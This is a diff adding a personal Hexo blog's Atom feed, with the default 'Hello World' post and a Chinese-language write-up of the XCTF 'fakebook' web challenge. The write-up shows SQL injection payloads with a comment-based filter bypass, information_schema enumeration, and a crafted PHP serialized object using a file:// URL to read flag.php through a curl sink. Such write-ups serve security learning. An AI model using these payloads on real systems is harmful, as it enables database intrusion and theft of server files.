@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>r4yn&#39;bolg</title>
+  
+  <subtitle>r4yn</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://lg10.cn/"/>
+  <updated>2020-06-22T15:27:27.410Z</updated>
+  <id>http://lg10.cn/</id>
+  
+  <author>
+    <name>r4yn</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://lg10.cn/2020/06/17/hello-world/"/>
+    <id>http://lg10.cn/2020/06/17/hello-world/</id>
+    <published>2020-06-17T07:23:17.440Z</published>
+    <updated>2020-06-22T15:27:27.410Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;More info: &lt;a href=&quot;https://hexo.io/docs/writing.html&quot;&gt;Writing&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Run-server&quot;&gt;&lt;a href=&quot;#Run-server&quot; class=&quot;headerlink&quot; title=&quot;Run server&quot;&gt;&lt;/a&gt;Run server&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>xctf_fatebook</title>
+    <link href="http://lg10.cn/2020/03/22/xctf-fatebook/"/>
+    <id>http://lg10.cn/2020/03/22/xctf-fatebook/</id>
+    <published>2020-03-21T16:04:00.000Z</published>
+    <updated>2020-06-22T16:06:30.132Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="xctf-fatebook"><a href="#xctf-fatebook" class="headerlink" title="xctf fatebook"></a>xctf fatebook</h1><ul><li>mariadb 数据库注入</li><li>随便点点，注册进去</li><li><img src="https://i.loli.net/2020/06/06/VnKQwNDTchseZAv.jpg" alt="批注 2020-06-06 223046.jpg"><a id="more"></a></li><li>用户名处发现参数</li></ul><blockquote></blockquote><p> <img src="https://i.loli.net/2020/06/06/adZiX2tYGNTgJcW.jpg" alt="批注 2020-06-06 223118.jpg"></p><ol><li>测试一下有没有注入，<br><img src="https://i.loli.net/2020/06/06/yoins23G4YUhcEN.jpg" alt="批注 2020-06-06 223140.jpg"><blockquote><p>出现报错，</p></blockquote></li></ol><p>2.查询字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 order by 4#</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/06/utn6EHLlSaYbDW5.jpg" alt="批注 2020-06-06 223253.jpg"></p><ol start="3"><li>查询数据库</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,database(),1,1 #</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/06/DJAmdoSekCv5jst.jpg" alt="批注 2020-06-06 224814.jpg"></p><blockquote><p>关键词被屏蔽</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select 1,database(),1,1 #</span><br></pre></td></tr></table></figure><p>绕过<br><img src="https://i.loli.net/2020/06/06/DJAmdoSekCv5jst.jpg" alt="批注 2020-06-06 224814.jpg"></p><ol start="4"><li>查询表名</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select 1,group_concat(table_name),1,1 from information_schema.tables where table_schema&#x3D;&#39;fakebook&#39;#</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/06/ICs4vEBGXZT5Vcr.jpg" alt="批注 2020-06-06 225506.jpg"></p><p>5.查询列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union&#x2F;**&#x2F;select 1,group_concat(column_name),1,1 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/06/06/GPjyhUL1F7eWEnp.jpg" alt="批注 2020-06-06 225714.jpg"></p><ol start="6"><li>序列化漏洞<br>robots.txt文件查到文件</li></ol><html><?php<p>class UserInfo<br>{<br>    public $name = “”;<br>    public $age = 0;<br>    public $blog = “”;</p><pre><code>public function __construct($name, $age, $blog){    $this-&gt;name = $name;    $this-&gt;age = (int)$age;    $this-&gt;blog = $blog;}function get($url){    $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    $output = curl_exec($ch);    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);    if($httpCode == 404) {        return 404;    }    curl_close($ch);    return $output;}public function getBlogContents (){    return $this-&gt;get($this-&gt;blog);}public function isValidBlog (){    $blog = $this-&gt;blog;    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);}</code></pre><p>}</p></html><p>构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; 1;</span><br><span class="line">    public $age &#x3D; 1;</span><br><span class="line">    public $blog &#x3D; &quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">    $data &#x3D; new UserInfo();</span><br><span class="line">    echo(serialize($data));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2020/06/06/W8rYU7wlubyKX6L.jpg" alt="批注 2020-06-06 231308.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;i:1;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>由curl_exec()函数构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>得到<br><img src="https://i.loli.net/2020/06/06/V7GnIvCqBTHQ5mt.jpg" alt="批注 2020-06-06 232233.jpg"><br>查看源码，再点击iframe标签<br><img src="https://i.loli.net/2020/06/06/W4Rgs5AovQGTyDP.jpg" alt="批注 2020-06-06 230505.jpg"></p><html>flag{c1e552fdf77049fabf65168f22f7aeab}</html>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;xctf-fatebook&quot;&gt;&lt;a href=&quot;#xctf-fatebook&quot; class=&quot;headerlink&quot; title=&quot;xctf fatebook&quot;&gt;&lt;/a&gt;xctf fatebook&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;mariadb 数据库注入&lt;/li&gt;
+&lt;li&gt;随便点点，注册进去&lt;/li&gt;
+&lt;li&gt;&lt;img src=&quot;https://i.loli.net/2020/06/06/VnKQwNDTchseZAv.jpg&quot; alt=&quot;批注 2020-06-06 223046.jpg&quot;&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="xctf" scheme="http://lg10.cn/tags/xctf/"/>
+    
+  </entry>
+  
+</feed>
